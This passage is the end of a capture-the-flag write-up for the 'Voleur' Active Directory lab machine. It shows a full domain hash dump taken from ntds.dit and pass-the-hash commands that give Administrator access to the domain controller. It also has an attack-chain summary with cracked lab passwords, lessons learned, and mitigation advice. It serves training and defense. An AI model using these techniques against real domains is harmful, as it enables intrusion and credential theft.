$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from Backups/Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Cleaning up...
```

**COMPLETE DOMAIN COMPROMISE!** We have extracted:

1. **Administrator NTLM Hash**: `e656e07c56d831611b577b160b259ad2`
2. **krbtgt Hash**: For Golden Ticket attacks
3. **All User Hashes**: Every single domain user's password hash
4. **Machine Account Secrets**: Including DPAPI keys
5. **LSA Secrets**: Additional system secrets

**Understanding the Hash Format**

The hash format is: `username:RID:LM_hash:NTLM_hash:::`

* **LM Hash**: `aad3b435b51404eeaad3b435b51404ee` (this is the empty/disabled LM hash)
* **NTLM Hash**: The actual password hash we can use

**Pass-the-Hash Attack to Get Administrator Shell**

With the Administrator's NTLM hash, we can perform a **Pass-the-Hash** attack without needing the plaintext password. We'll use `evil-winrm`:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h evil-winrm -i dc.voleur.htb -u Administrator -H e656e07c56d831611b577b160b259ad2
```

**Alternatively**, we can use `impacket-psexec`:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 Administrator@dc.voleur.htb
```

**Or use `impacket-wmiexec`**:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 Administrator@dc.voleur.htb
```

**Success!** We now have **SYSTEM/Administrator** level access to the Domain Controller!

**Retrieving the Flags**

Once connected as Administrator:

```powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

And we can also grab the user flag:

```powershell
C:\Windows\system32> type C:\Users\ryan.naylor\Desktop\user.txt
```

***

### Attack Chain Overview

Here's the complete attack path visualization:

```
Initial Access (ryan.naylor)
         |
         | Enumerate SMB shares
         v
   Access_Review.xlsx (encrypted)
         |
         | office2john + hashcat (password: football1)
         v
   Credentials Found:
   - svc_ldap:M1XyC9pW7qT5Vn
   - svc_iis:N5pXyW1VqM7CZ8
   - (deleted):NightT1meP1dg3on14
         |
         | BloodHound enumeration with svc_ldap
         v
   AddKeyCredentialLink permission on svc_winrm
         |
         | Targeted Kerberoasting
         v
   svc_winrm hash → hashcat → AFireInsidedeOzarctica980219afi
         |
         | Dead end, check for more svc_ldap permissions
         v
   bloodyAD --include-del finds deleted user todd.wolfe
         |
         | Restore todd.wolfe with bloodyAD
         v
   todd.wolfe:NightT1meP1dg3on14 (Second-Line Support)
         |
         | Access Second-Line Support folder
         v
   DPAPI files for todd.wolfe found
         |
         | Decrypt masterkey → Decrypt credential blob
         v
   jeremy.combs:qT3V9pLXyN7W4m (Third-Line Support)
         |
         | Access Third-Line Support folder
         v
   Found: id_rsa + Note.txt.txt (WSL backup setup)
         |
         | SSH to port 2222 as svc_backup
         v
   WSL Shell → /mnt/c/ access
         |
         | Found: ntds.dit + SYSTEM + SECURITY backups
         v
   impacket-secretsdump → ALL domain hashes
         |
         | Pass-the-Hash with Administrator hash
         v
   DOMAIN ADMIN / SYSTEM ACCESS
```

***

### Key Techniques & Lessons Learned

#### 1. **Kerberos-Only Authentication**

The box forced us to use Kerberos authentication (`-k` flag) because NTLM was disabled. This is becoming more common in secure environments.

#### 2. **Time Synchronization**

The 8-hour clock skew required using `faketime` for all Kerberos operations. Kerberos is very time-sensitive (default tolerance is 5 minutes).

#### 3. **Office Document Password Cracking**

* `office2john` to extract hashes
* `john` or `hashcat` to crack
* Common passwords like "football1" are still widely used

#### 4. **Active Directory Enumeration**

* BloodHound is essential for finding privilege escalation paths
* Always use `--include-del` flags when looking for deleted objects
* Service accounts often have interesting permissions

#### 5. **Targeted Kerberoasting**

When you have permission to modify an account's SPN (Service Principal Name), you can:

* Add a fake SPN
* Request a Kerberos ticket
* Crack it offline

#### 6. **Restoring Deleted AD Objects**

Deleted objects remain in the "Deleted Objects" container for the tombstone lifetime (default 180 days). With proper permissions, they can be restored.

#### 7. **DPAPI Credential Recovery**

Windows stores encrypted credentials using DPAPI. If you have:

* User's password or NTLM hash
* User's SID
* Access to their DPAPI files

You can decrypt stored credentials, certificates, and other secrets.

#### 8. **WSL as an Attack Vector**

WSL provides Linux access on Windows systems:

* Can access Windows filesystem via `/mnt/c/`
* SSH access may be enabled for Linux tools
* May have access to files that Windows permissions don't protect the same way

#### 9. **ntds.dit = Complete Domain Compromise**

The Active Directory database contains:

* All user password hashes
* Group memberships
* Trust relationships
* Domain configuration

Stealing and decrypting this file means total domain compromise.

#### 10. **Defense Evasion**

Throughout this attack:

* No malware was used
* All tools are legitimate AD management utilities
* Actions would blend in with normal IT operations
* Detection would require detailed logging and behavioral analysis

***

### Mitigation Recommendations

#### For Organizations

1. **Secure File Shares**
   * Don't store sensitive documents (even encrypted ones) on accessible shares
   * Regular access reviews
   * Principle of least privilege
2. **Strong Password Policy**
   * Enforce minimum complexity
   * Ban common passwords like "football1"
   * Implement password managers
3. **Active Directory Hardening**
   * Regular permission audits
   * Monitor for object restoration events
   * Implement tiering model for admin accounts
   * Enable Credential Guard
4. **Backup Security**
   * Store backups offline or in isolated networks
   * Encrypt backups with keys stored separately
   * Never store ntds.dit backups on domain-connected systems
5. **WSL Security**
   * Disable WSL if not required
   * Monitor SSH access
   * Apply principle of least privilege to WSL users
6. **Monitoring & Detection**
   * Enable advanced AD auditing
   * Monitor for unusual Kerberos ticket requests
   * Alert on DPAPI file access
   * Log all object restoration events
   * Detect secretsdump-like behavior
7. **Service Account Management**
   * Use Group Managed Service Accounts (gMSA)
   * Regular password rotation
   * Minimal permissions
   * Monitor for SPN changes

***

### Conclusion

The Voleur machine demonstrated a realistic Active Directory penetration testing scenario with multiple stages of privilege escalation. The attack chain required:

1. **Password cracking** of an encrypted Excel file
2. **Active Directory enumeration** using BloodHound
3. **Targeted Kerberoasting** to compromise service accounts
4. **Deleted object restoration** to access archived data
5. **DPAPI decryption** to recover stored credentials
6. **WSL exploitation** to access Windows files from Linux
7. **Database extraction** to achieve complete domain compromise

Each stage built upon the previous, requiring careful enumeration and understanding of Windows and Active Directory security mechanisms. The final compromise through ntds.dit extraction represents one of the most severe outcomes in an Active Directory environment - complete access to all user credentials.

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
